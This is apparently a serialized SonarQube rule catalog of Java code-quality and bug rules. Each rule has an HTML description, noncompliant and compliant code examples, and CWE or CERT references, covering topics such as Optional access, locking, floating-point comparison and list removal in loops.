javaS3655@Optional value should only be accessed after calling isPresent()"MAJOR*java:—	<p><code>Optional</code> value can hold either a value or not. The value held in the <code>Optional</code> can be accessed using the
<code>get()</code> method, but it will throw a </p>
<p><code>NoSuchElementException</code> if there is no value present. To avoid the exception, calling the <code>isPresent()</code> or <code>!
isEmpty()</code> method should always be done before any call to <code>get()</code>.</p>
<p>Alternatively, note that other methods such as <code>orElse(...)</code>, <code>orElseGet(...)</code> or <code>orElseThrow(...)</code> can be used
to specify what to do with an empty <code>Optional</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Optional&lt;String&gt; value = this.getOptionalValue();

// ...

String stringValue = value.get(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Optional&lt;String&gt; value = this.getOptionalValue();

// ...

if (value.isPresent()) {
  String stringValue = value.get();
}
</pre>
<p>or</p>
<pre>
Optional&lt;String&gt; value = this.getOptionalValue();

// ...

String stringValue = value.orElse("default");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/476.html">MITRE, CWE-476</a> - NULL Pointer Dereference </li>
</ul>ZBUG
ˇ

java:S2445
javaS24457Blocks should be synchronized on "private final" fields"MAJOR*java:ï<p>Synchronizing on a class field synchronizes not on the field itself, but on the object assigned to it. So synchronizing on a non-<code>final</code>
field makes it possible for the field's value to change while a thread is in a block synchronized on the old value. That would allow a second thread,
synchronized on the new value, to enter the block at the same time.</p>
<p>The story is very similar for synchronizing on parameters; two different threads running the method in parallel could pass two different object
instances in to the method as parameters, completely undermining the synchronization.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private String color = "red";

private void doSomething(){
  synchronized(color) {  // Noncompliant; lock is actually on object instance "red" referred to by the color variable
    //...
    color = "green"; // other threads now allowed into this block
    // ...
  }
  synchronized(new Object()) { // Noncompliant this is a no-op.
     // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private String color = "red";
private final Object lockObj = new Object();

private void doSomething(){
  synchronized(lockObj) {
    //...
    color = "green";
    // ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/412.html">MITRE, CWE-412</a> - Unrestricted Externally Accessible Lock </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/413">MITRE, CWE-413</a> - Improper Resource Locking </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/6IEzAg">CERT, LCK00-J.</a> - Use private final lock objects to synchronize classes that
  may interact with untrusted code </li>
</ul>ZBUG
ﬂ

java:S2204–
javaS2204E".equals()" should not be used to test the values of "Atomic" classes"MAJOR*java:Á<p><code>AtomicInteger</code>, and <code>AtomicLong</code> extend <code>Number</code>, but they're distinct from <code>Integer</code> and
<code>Long</code> and should be handled differently. <code>AtomicInteger</code> and <code>AtomicLong</code> are designed to support lock-free,
thread-safe programming on single variables. As such, an <code>AtomicInteger</code> will only ever be "equal" to itself. Instead, you should
<code>.get()</code> the value and make comparisons on it.</p>
<p>This applies to all the atomic, seeming-primitive wrapper classes: <code>AtomicInteger</code>, <code>AtomicLong</code>, and
<code>AtomicBoolean</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
AtomicInteger aInt1 = new AtomicInteger(0);
AtomicInteger aInt2 = new AtomicInteger(0);

if (aInt1.equals(aInt2)) { ... }  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
AtomicInteger aInt1 = new AtomicInteger(0);
AtomicInteger aInt2 = new AtomicInteger(0);

if (aInt1.get() == aInt2.get()) { ... }
</pre>ZBUG
å

java:S2446˝
javaS2446"notifyAll" should be used"MAJOR*java:ø<p><code>notify</code> and <code>notifyAll</code> both wake up sleeping threads, but <code>notify</code> only rouses one, while <code>notifyAll</code>
rouses all of them. Since <code>notify</code> might not wake up the right thread, <code>notifyAll</code> should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyThread extends Thread{

  @Override
  public void run(){
    synchronized(this){
      // ...
      notify();  // Noncompliant
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyThread extends Thread{

  @Override
  public void run(){
    synchronized(this){
      // ...
      notifyAll();
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/OoAlAQ">CERT, THI02-J.</a> - Notify all waiting threads rather than a single thread
  </li>
</ul>ZBUG
¡

java:S2201≤
javaS2201GReturn values from functions without side effects should not be ignored"MAJOR*java:«<p>When the call to a function doesn't have any side effects, what is the point of making the call if the results are ignored? In such case, either
the function call is useless and should be dropped or the source code doesn't behave as expected.</p>
<p>To prevent generating any false-positives, this rule triggers an issue only on the following predefined list of immutable classes in the Java API
:</p>
<ul>
  <li> <code>java.lang.String</code> </li>
  <li> <code>java.lang.Boolean</code> </li>
  <li> <code>java.lang.Integer</code> </li>
  <li> <code>java.lang.Double</code> </li>
  <li> <code>java.lang.Float</code> </li>
  <li> <code>java.lang.Byte</code> </li>
  <li> <code>java.lang.Character</code> </li>
  <li> <code>java.lang.Short</code> </li>
  <li> <code>java.lang.StackTraceElement</code> </li>
  <li> <code>java.time.DayOfWeek</code> </li>
  <li> <code>java.time.Duration</code> </li>
  <li> <code>java.time.Instant</code> </li>
  <li> <code>java.time.LocalDate</code> </li>
  <li> <code>java.time.LocalDateTime</code> </li>
  <li> <code>java.time.LocalTime</code> </li>
  <li> <code>java.time.Month</code> </li>
  <li> <code>java.time.MonthDay</code> </li>
  <li> <code>java.time.OffsetDateTime</code> </li>
  <li> <code>java.time.OffsetTime</code> </li>
  <li> <code>java.time.Period</code> </li>
  <li> <code>java.time.Year</code> </li>
  <li> <code>java.time.YearMonth</code> </li>
  <li> <code>java.time.ZonedDateTime</code> </li>
  <li> <code>java.math.BigInteger</code> </li>
  <li> <code>java.math.BigDecimal</code> </li>
  <li> <code>java.util.Optional</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public void handle(String command){
  command.toLowerCase(); // Noncompliant; result of method thrown away
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void handle(String command){
  String formattedCommand = command.toLowerCase();
  ...
}
</pre>
<h2>Exceptions</h2>
<p>This rule will not raise an issue when both these conditions are met:</p>
<ul>
  <li> The method call is in a <code>try</code> block with an associated <code>catch</code> clause. </li>
  <li> The method name starts with "parse", "format", "decode" or "valueOf" or the method is <code>String.getBytes(Charset)</code>. </li>
</ul>
<pre>
private boolean textIsInteger(String textToCheck) {

    try {
        Integer.parseInt(textToCheck, 10); // OK
        return true;
    } catch (NumberFormatException ignored) {
        return false;
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9gEqAQ">CERT, EXP00-J.</a> - Do not ignore values returned by methods </li>
</ul>ZBUG
Î	

java:S2441‹	
javaS2441FNon-serializable objects should not be stored in "HttpSession" objects"MAJOR*java:Ú<p>If you have no intention of writting an <code>HttpSession</code> object to file, then storing non-<code>serializable</code> objects in it may not
seem like a big deal. But whether or not you explicitly serialize the session, it may be written to disk anyway, as the server manages its memory use
in a process called "passivation". Further, some servers automatically write their active sessions out to file at shutdown &amp; deserialize any such
sessions at startup.</p>
<p>The point is, that even though <code>HttpSession</code> does not <code>extend Serializable</code>, you must nonetheless assume that it will be
serialized, and understand that if you've stored non-serializable objects in the session, errors will result. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Address {
  //...
}

//...
HttpSession session = request.getSession();
session.setAttribute("address", new Address());  // Noncompliant; Address isn't serializable
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/579.html">MITRE, CWE-579</a> - J2EE Bad Practices: Non-serializable Object Stored in Session
  </li>
</ul>ZBUG
ú

java:S1111ç
javaS11111The Object.finalize() method should not be called"MAJOR*java:∏<p>According to the official javadoc documentation, this Object.finalize() is called by the garbage collector on an object when garbage collection
determines that there are no more references to the object. Calling this method explicitly breaks this contract and so is misleading. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public void dispose() throws Throwable {
  this.finalize();                       // Noncompliant
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/586.html">MITRE, CWE-586</a> - Explicit Call to Finalize() </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/H4cbAQ">CERT, MET12-J.</a> - Do not use finalizers </li>
</ul>ZBUG
˙

java:S2442Î
javaS2442+"Lock" objects should not be "synchronized""MAJOR*java:ï<p><code>java.util.concurrent.locks.Lock</code> offers far more powerful and flexible locking operations than are available with
<code>synchronized</code> blocks. So synchronizing on a <code>Lock</code> throws away the power of the object, and is just silly. Instead, such
objects should be locked and unlocked using <code>tryLock()</code> and <code>unlock()</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Lock lock = new MyLockImpl();
synchronized(lock) {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
Lock lock = new MyLockImpl();
lock.tryLock();
//...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/cQCaAg">CERT, LCK03-J.</a> - Do not synchronize on the intrinsic locks of high-level
  concurrency objects </li>
</ul>Z
CODE_SMELL
Æ

java:S1110ü
javaS11100Redundant pairs of parentheses should be removed"MAJOR*java:ƒ<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
int x = (y / 2 + 1);   //Compliant even if the parenthesis are ignored by the compiler

if (a &amp;&amp; ((x+y &gt; 0))) {  // Noncompliant
  //...
}

return ((x + 1));  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int x = (y / 2 + 1);

if (a &amp;&amp; (x+y &gt; 0)) {
  //...
}

return (x + 1);
</pre>Z
CODE_SMELL
˙

java:S2681Î
javaS26813Multiline blocks should be enclosed in curly braces"MAJOR*java:ç<p>Curly braces can be omitted from a one-line block, such as with an <code>if</code> statement or <code>for</code> loop, but doing so can be
misleading and induce bugs. </p>
<p>This rule raises an issue when the whitespacing of the lines after a one line block indicates an intent to include those lines in the block, but
the omission of curly braces means the lines will be unconditionally executed once.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)
  firstActionInBlock();
  secondAction();  // Noncompliant; executed unconditionally
thirdAction();

if (condition) firstActionInBlock(); secondAction();  // Noncompliant; secondAction executed unconditionally

if (condition) firstActionInBlock();  // Noncompliant
  secondAction();  // Executed unconditionally

if (condition); secondAction();  // Noncompliant; secondAction executed unconditionally

String str = null;
for (int i = 0; i &lt; array.length; i++)
  str = array[i];
  doTheThing(str);  // Noncompliant; executed only on last array element
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {
  firstActionInBlock();
  secondAction();
}
thirdAction();

String str = null;
for (int i = 0; i &lt; array.length; i++) {
  str = array[i];
  doTheThing(str);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/483.html">MITRE, CWE-483</a> - Incorrect Block Delimitation </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/3wHEAw">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
</ul>Z
CODE_SMELL
ˇ
java:NoSonarÓ
javaNoSonar Track uses of "NOSONAR" comments"MAJOR*java2S1291:ö<p>Any issue to quality rule can be deactivated with the <code>NOSONAR</code> marker. This marker is pretty useful to exclude false-positive results
but it can also be used abusively to hide real quality flaws.</p>
<p>This rule raises an issue when <code>NOSONAR</code> is used.</p>Z
CODE_SMELL
ò	

java:S2440â	
javaS2440=Classes with only "static" methods should not be instantiated"MAJOR*java:°<p><code>static</code> methods can be accessed without an instance of the enclosing class, so there's no reason to instantiate a class that has only
<code>static</code> methods.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class TextUtils {
  public static String stripHtml(String source) {
    return source.replaceAll("&lt;[^&gt;]+&gt;", "");
  }
}

public class TextManipulator {

  // ...

  public void cleanText(String source) {
    TextUtils textUtils = new TextUtils(); // Noncompliant

    String stripped = textUtils.stripHtml(source);

    //...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class TextUtils {
  public static String stripHtml(String source) {
    return source.replaceAll("&lt;[^&gt;]+&gt;", "");
  }
}

public class TextManipulator {

  // ...

  public void cleanText(String source) {
    String stripped = TextUtils.stripHtml(source);

    //...
  }
}
</pre>
<h2>See Also</h2>
<ul>
  <li> <a href='/coding_rules#rule_key=squid%3AS1118'>S1118</a> - Utility classes should not have public constructors </li>
</ul>Z
CODE_SMELL
·

java:S2209“
javaS2209."static" members should be accessed statically"MAJOR*java:˘<p>While it is <em>possible</em> to access <code>static</code> members from a class instance, it's bad form, and considered by most to be misleading
because it implies to the readers of your code that there's an instance of the member per class instance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class A {
  public static int counter = 0;
}

public class B {
  private A first = new A();
  private A second = new A();

  public void runUpTheCount() {
    first.counter ++;  // Noncompliant
    second.counter ++;  // Noncompliant. A.counter is now 2, which is perhaps contrary to expectations
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class A {
  public static int counter = 0;
}

public class B {
  private A first = new A();
  private A second = new A();

  public void runUpTheCount() {
    A.counter ++;  // Compliant
    A.counter ++;  // Compliant
  }
}
</pre>Z
CODE_SMELL
û

java:S3417è
javaS3417%Track uses of disallowed dependencies"MAJOR*java:Ω<p>Whether they are disallowed locally for security, license, or dependability reasons, forbidden dependencies should not be used. </p>
<p>This rule raises an issue when the group or artifact id of a direct dependency matches the configured forbidden dependency pattern. </p>
<h2>Noncompliant Code Example</h2>
<p>With a parameter of: <code>*:.*log4j.*</code></p>
<pre>
&lt;dependency&gt; &lt;!-- Noncompliant --&gt;
    &lt;groupId&gt;log4j&lt;/groupId&gt;
    &lt;artifactId&gt;log4j&lt;/artifactId&gt;
    &lt;version&gt;1.2.17&lt;/version&gt;
&lt;/dependency&gt;
</pre>@Z
CODE_SMELL
Ø

java:S1119†
javaS1119Labels should not be used"MAJOR*java:‹<p>Labels are not commonly used in Java, and many developers do not understand how they work. Moreover, their usage makes the control flow harder to
follow, which reduces the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int matrix[][] = {
  {1, 2, 3},
  {4, 5, 6},
  {7, 8, 9}
};

outer: for (int row = 0; row &lt; matrix.length; row++) {   // Non-Compliant
  for (int col = 0; col &lt; matrix[row].length; col++) {
    if (col == row) {
      continue outer;
    }
    System.out.println(matrix[row][col]);                // Prints the elements under the diagonal, i.e. 4, 7 and 8
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int row = 1; row &lt; matrix.length; row++) {          // Compliant
  for (int col = 0; col &lt; row; col++) {
    System.out.println(matrix[row][col]);                // Also prints 4, 7 and 8
  }
}
</pre>Z
CODE_SMELL
∂

java:S1118ß
javaS11183Utility classes should not have public constructors"MAJOR*java:…<p>Utility classes, which are collections of <code>static</code> members, are not meant to be instantiated. Even abstract utility classes, which can
be extended, should not have public constructors.</p>
<p>Java adds an implicit public constructor to every class which does not define at least one explicitly. Hence, at least one non-public constructor
should be defined.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class StringUtils { // Noncompliant

  public static String concatenate(String s1, String s2) {
    return s1 + s2;
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
class StringUtils { // Compliant

  private StringUtils() {
    throw new IllegalStateException("Utility class");
  }

  public static String concatenate(String s1, String s2) {
    return s1 + s2;
  }

}
</pre>
<h2>Exceptions</h2>
<p>When class contains <code>public static void main(String[] args)</code> method it is not considered as utility class and will be ignored by this
rule.</p>Z
CODE_SMELL
æ

java:S3415Ø
javaS34159Assertion arguments should be passed in the correct order"MAJOR*java:À<p>The standard assertions library methods such as <code>org.junit.Assert.assertEquals</code>, and <code>org.junit.Assert.assertSame</code> expect the
first argument to be the expected value and the second argument to be the actual value. Swap them, and your test will still have the same outcome
(succeed/fail when it should) but the error messages will be confusing. </p>
<p>This rule raises an issue when the second argument to an assertions library method is a hard-coded value and the first argument is not.</p>
<h2>Noncompliant Code Example</h2>
<pre>
org.junit.Assert.assertEquals(runner.exitCode(), 0, "Unexpected exit code");  // Noncompliant; Yields error message like: Expected:&lt;-1&gt;. Actual:&lt;0&gt;.
</pre>
<h2>Compliant Solution</h2>
<pre>
org.junit.Assert.assertEquals(0, runner.exitCode(), "Unexpected exit code");
</pre>Z
CODE_SMELL
ˆ

java:S2326Á
javaS2326(Unused type parameters should be removed"MAJOR*java:î<p>Type parameters that aren't used are dead code, which can only distract and possibly confuse developers during maintenance. Therefore, unused type
parameters should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int &lt;T&gt; Add(int a, int b) // Noncompliant; &lt;T&gt; is ignored
{
  return a + b;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int Add(int a, int b)
{
  return a + b;
}
</pre>Z
CODE_SMELL
∏

java:S1117©
javaS1117.Local variables should not shadow class fields"MAJOR*java:–<p>Overriding or shadowing a variable declared in an outer scope can strongly impact the readability, and therefore the maintainability, of a piece of
code. Further, it could lead maintainers to introduce bugs because they think they're using one variable but are really using another.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Foo {
  public int myField;

  public void doSomething() {
    int myField = 0;
    ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/DCL01-C.+Do+not+reuse+variable+names+in+subscopes">CERT, DCL01-C.</a> - Do not reuse
  variable names in subscopes </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/DCL51-J.+Do+not+shadow+or+obscure+identifiers+in+subscopes">CERT, DCL51-J.</a> - Do
  not shadow or obscure identifiers in subscopes </li>
</ul>Z
CODE_SMELL
”

java:S1479ƒ
javaS1479;"switch" statements should not have too many "case" clauses"MAJOR*java:ﬁ<p>When <code>switch</code> statements have large sets of <code>case</code> clauses, it is usually an attempt to map two sets of data. A real map
structure would be more readable and maintainable, and should be used instead.</p>
<h2>Exceptions</h2>
<p>This rule ignores <code>switch</code>es over <code>Enum</code>s and empty, fall-through cases.</p>Z
CODE_SMELL
œ

java:S1244¿
javaS12448Floating point numbers should not be tested for equality"MAJOR*java:‰<p>Floating point math is imprecise because of the challenges of storing such values in a binary representation. Even worse, floating point math is
not associative; push a <code>float</code> or a <code>double</code> through a series of simple mathematical operations and the answer will be
different based on the order of those operation because of the rounding that takes place at each step.</p>
<p>Even simple floating point assignments are not simple:</p>
<pre>
float f = 0.1; // 0.100000001490116119384765625
double d = 0.1; // 0.1000000000000000055511151231257827021181583404541015625
</pre>
<p>(Results will vary based on compiler and compiler settings);</p>
<p>Therefore, the use of the equality (<code>==</code>) and inequality (<code>!=</code>) operators on <code>float</code> or <code>double</code> values
is almost always an error. Instead the best course is to avoid floating point comparisons altogether. When that is not possible, you should consider
using one of Java's float-handling <code>Numbers</code> such as <code>BigDecimal</code> which can properly handle floating point comparisons. A third
option is to look not for equality but for whether the value is close enough. I.e. compare the absolute value of the difference between the stored
value and the expected value against a margin of acceptable error. Note that this does not cover all cases (<code>NaN</code> and <code>Infinity</code>
for instance).</p>
<p>This rule checks for the use of direct and indirect equality/inequailty tests on floats and doubles.</p>
<h2>Noncompliant Code Example</h2>
<pre>
float myNumber = 3.146;
if ( myNumber == 3.146f ) { //Noncompliant. Because of floating point imprecision, this will be false
  // ...
}
if ( myNumber != 3.146f ) { //Noncompliant. Because of floating point imprecision, this will be true
  // ...
}

if (myNumber &lt; 4 || myNumber &gt; 4) { // Noncompliant; indirect inequality test
  // ...
}

float zeroFloat = 0.0f;
if (zeroFloat == 0) {  // Noncompliant. Computations may end up with a value close but not equal to zero.
}
</pre>
<h2>Exceptions</h2>
<p>Since <code>NaN</code> is not equal to itself, the specific case of testing a floating point value against itself is a valid test for
<code>NaN</code> and is therefore ignored. Though using <code>Double.isNaN</code> method should be preferred instead, as intent is more explicit.</p>
<pre>
float f;
double d;
if(f != f) { // Compliant; test for NaN value
  System.out.println("f is NaN");
} else if (f != d) { // Noncompliant
  // ...
}
</pre>ZBUG
›

java:S1123Œ
javaS1123GDeprecated elements should have both the annotation and the Javadoc tag"MAJOR*java:‹<p>Deprecation should be marked with both the <code>@Deprecated</code> annotation and @deprecated Javadoc tag. The annotation enables tools such as
IDEs to warn about referencing deprecated elements, and the tag can be used to explain when it was deprecated, why, and how references should be
refactored. </p>
<p>Further, Java 9 adds two additional arguments to the annotation:</p>
<ul>
  <li> <code>since</code> allows you to describe when the deprecation took place </li>
  <li> <code>forRemoval</code>, indicates whether the deprecated element will be removed at some future date </li>
</ul>
<p>If your compile level is Java 9 or higher, you should be using one or both of these arguments.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {

  @Deprecated
  public void foo1() {
  }

  /**
    * @deprecated
    */
  public void foo2() {    // Noncompliant
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {

  /**
    * @deprecated (when, why, refactoring advice...)
    */
  @Deprecated
  public void foo1() {
  }

  /**
    * Java &gt;= 9
    * @deprecated (when, why, refactoring advice...)
    */
  @Deprecated(since="5.1")
  public void foo2() {
  }

  /**
    * Java &gt;= 9
    * @deprecated (when, why, refactoring advice...)
    */
  @Deprecated(since="4.2", forRemoval=true)
  public void foo3() {
  }

}
</pre>
<h2>Exceptions</h2>
<p>The members and methods of a deprecated class or interface are ignored by this rule. The classes and interfaces themselves are still subject to
it.</p>
<pre>
/**
 * @deprecated (when, why, etc...)
 */
@Deprecated
class Qix  {

  public void foo() {} // Compliant; class is deprecated

}

/**
 * @deprecated (when, why, etc...)
 */
@Deprecated
interface Plop {

  void bar();

}
</pre>Z
CODE_SMELL
É

java:S2694Ù
javaS2694LInner classes which do not reference their owning classes should be "static""MAJOR*java:˝<p>A non-static inner class has a reference to its outer class, and access to the outer class' fields and methods. That class reference makes the
inner class larger and could cause the outer class instance to live in memory longer than necessary. </p>
<p>If the reference to the outer class isn't used, it is more efficient to make the inner class <code>static</code> (also called nested). If the
reference is used only in the class constructor, then explicitly pass a class reference to the constructor. If the inner class is anonymous, it will
also be necessary to name it. </p>
<p>However, while a nested/<code>static</code> class would be more efficient, it's worth noting that there are semantic differences between an inner
class and a nested one:</p>
<ul>
  <li> an inner class can only be instantiated within the context of an instance of the outer class. </li>
  <li> a nested (<code>static</code>) class can be instantiated independently of the outer class. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit {
  // ...

  public class Seed {  // Noncompliant; there's no use of the outer class reference so make it static
    int germinationDays = 0;
    public Seed(int germinationDays) {
      this.germinationDays = germinationDays;
    }
    public int getGerminationDays() {
      return germinationDays;
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit {
  // ...

  public static class Seed {
    int germinationDays = 0;
    public Seed(int germinationDays) {
      this.germinationDays = germinationDays;
    }
    public int getGerminationDays() {
      return germinationDays;
    }
  }
}
</pre>Z
CODE_SMELL
Â

java:S2211÷
javaS2211Types should be used in lambdas"MAJOR*java:å<p>Shared coding conventions allow teams to collaborate effectively. While types for lambda arguments are optional, specifying them anyway makes the
code clearer and easier to read.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Arrays.sort(rosterAsArray,
    (a, b) -&gt; {  // Noncompliant
        return a.getBirthday().compareTo(b.getBirthday());
    }
);
</pre>
<h2>Compliant Solution</h2>
<pre>
Arrays.sort(rosterAsArray,
    (Person a, Person b) -&gt; {
        return a.getBirthday().compareTo(b.getBirthday());
    }
);
</pre>
<h2>Exceptions</h2>
<p>When the lambda has one or two parameters and does not have a block this rule will not fire up an issue as things are considered more readable in
those cases.</p>
<pre>
stream.map((a, b) -&gt; a.length); // compliant
</pre>Z
CODE_SMELL
ﬁ


java:S1121œ

javaS1121:Assignments should not be made from within sub-expressions"MAJOR*java:Í	<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable. Ideally, sub-expressions should not have
side-effects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ((str = cont.substring(pos1, pos2)).isEmpty()) {  // Noncompliant
  //...
</pre>
<h2>Compliant Solution</h2>
<pre>
str = cont.substring(pos1, pos2);
if (str.isEmpty()) {
  //...
</pre>
<h2>Exceptions</h2>
<p>Assignments in <code>while</code> statement conditions, and assignments enclosed in relational expressions are ignored.</p>
<pre>
BufferedReader br = new BufferedReader(/* ... */);
String line;
while ((line = br.readLine()) != null) {...}
</pre>
<p>Chained assignments, including compound assignments, are ignored.</p>
<pre>
int i = j = 0;
int k = (j += 1);
result = (bresult = new byte[len]);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/481.html">MITRE, CWE-481</a> - Assigning instead of Comparing </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/nYFtAg">CERT, EXP45-C.</a> - Do not perform assignments in selection statements </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/1gCTAw">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions
  </li>
</ul>Z
CODE_SMELL
”

java:S3306ƒ
javaS3306?Constructor injection should be used instead of field injection"MAJOR*java:·
<p>Field injection seems like a tidy way to get your classes what they need to do their jobs, but it's really a <code>NullPointerException</code>
waiting to happen unless all your class constructors are <code>private</code>. That's because any class instances that are constructed by callers,
rather than instantiated by a Dependency Injection framework compliant with the JSR-330 (Spring, Guice, ...), won't have the ability to perform the
field injection.</p>
<p>Instead <code>@Inject</code> should be moved to the constructor and the fields required as constructor parameters.</p>
<p>This rule raises an issue when classes with non-<code>private</code> constructors (including the default constructor) use field injection.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyComponent {  // Anyone can call the default constructor

  @Inject MyCollaborator collaborator;  // Noncompliant

  public void myBusinessMethod() {
    collaborator.doSomething();  // this will fail in classes new-ed by a caller
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyComponent {

  private final MyCollaborator collaborator;

  @Inject
  public MyComponent(MyCollaborator collaborator) {
    Assert.notNull(collaborator, "MyCollaborator must not be null!");
    this.collaborator = collaborator;
  }

  public void myBusinessMethod() {
    collaborator.doSomething();
  }
}
</pre>ZBUG
å


java:S4517˝	
javaS4517@InputSteam.read() implementation should not return a signed byte"MAJOR*java:ô	<p>According to the Java documentation, any implementation of the <code>InputSteam.read()</code> method is supposed to read the next byte of data from
the input stream. The value byte must be an <code>int</code> in the range 0 to 255. If no byte is available because the end of the stream has been
reached, the value -1 is returned.</p>
<p>But in Java, the <code>byte</code> primitive data type is an 8-bit signed two's complement integer. It has a minimum value of -128 and a maximum
value of 127. So by contract, the implementation of an <code>InputSteam.read()</code> method should never directly return a <code>byte</code>
primitive data type. A conversion into an unsigned byte must be done before by applying a bitmask.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Override
public int read() throws IOException {
  if (pos == buffer.length()) {
    return -1;
  }
  return buffer.getByte(pos++); // Noncompliant, a signed byte value is returned
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Override
public int read() throws IOException {
  if (pos == buffer.length()) {
    return -1;
  }
  return buffer.getByte(pos++) &amp; 0xFF; // The 0xFF bitmask is applied
}
</pre>ZBUG
å

java:S3358˝
javaS3358&Ternary operators should not be nested"MAJOR*java:¨<p>Just because you <em>can</em> do something, doesn't mean you should, and that's the case with nested ternary operations. Nesting ternary operators
results in the kind of code that may seem clear as day when you write it, but six months later will leave maintainers (or worse - future you)
scratching their heads and cursing.</p>
<p>Instead, err on the side of clarity, and use another line to express the nested operation as a separate statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String getTitle(Person p) {
  return p.gender == Person.MALE ? "Mr. " : p.isMarried() ? "Mrs. " : "Miss ";  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public String getTitle(Person p) {
  if (p.gender == Person.MALE) {
    return "Mr. ";
  }
  return p.isMarried() ? "Mrs. " : "Miss ";
}
</pre>Z
CODE_SMELL
ß

java:S5413ò
javaS5413;'List.remove()' should not be used in ascending 'for' loops"MAJOR*java:≤<p>When <code>List.remove()</code> is called it will shrink the list. If this is done inside the ascending loop iterating through all elements it will
skip the element after the removed index.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void removeFrom(List&lt;String&gt; list) {
  // expected: iterate over all the elements of the list
  for (int i = 0; i &lt; list.size(); i++) {
    if (list.get(i).isEmpty()) {
      // actual: remaining elements are shifted, so the one immediately following will be skipped
      list.remove(i); // Noncompliant
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>You can either adjust the loop index to account for the change in the size of the list</p>
<pre>
static void removeFrom(List&lt;String&gt; list) {
    // expected: iterate over all the elements of the list
    for (int i = 0; i &lt; list.size(); i++) {
      if (list.get(i).isEmpty()) {
        // actual: remaining elements are shifted, so the one immediately following will be skipped
        list.remove(i);
        i--;
      }
    }
  }
</pre>
<p>Or preferably it's probably better to rely on Java 8's <code>removeIf</code> method</p>
<pre>
 static void removeFrom(List&lt;String&gt; list) {
    list.removeIf(String::isEmpty);
  }
</pre>
<p>&nbsp;</p>
<h2>Exceptions</h2>
<p>The descending loop doesn't have this issue, because the index will be correct when we loop in descending order</p>
<pre>
void removeFrom(List&lt;String&gt; list) {
  for (int i = list.size() - 1; i &gt;= 0; i--) {
    if (list.get(i).isEmpty()) {
      list.remove(i);
    }
  }
}
</pre>
<p>&nbsp;</p>Z
CODE_SMELL
è

java:S2388Ä
javaS2388>Inner class calls to super class methods should be unambiguous"MAJOR*java:ó<p>When an inner class extends another class, and both its outer class and its parent class have a method with the same name, calls to that method can
be confusing. The compiler will resolve the call to the superclass method, but maintainers may be confused, so the superclass method should be called
explicitly, using <code>super.</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Parent {
  public void foo() { ... }
}

public class Outer {

  public void foo() { ... }

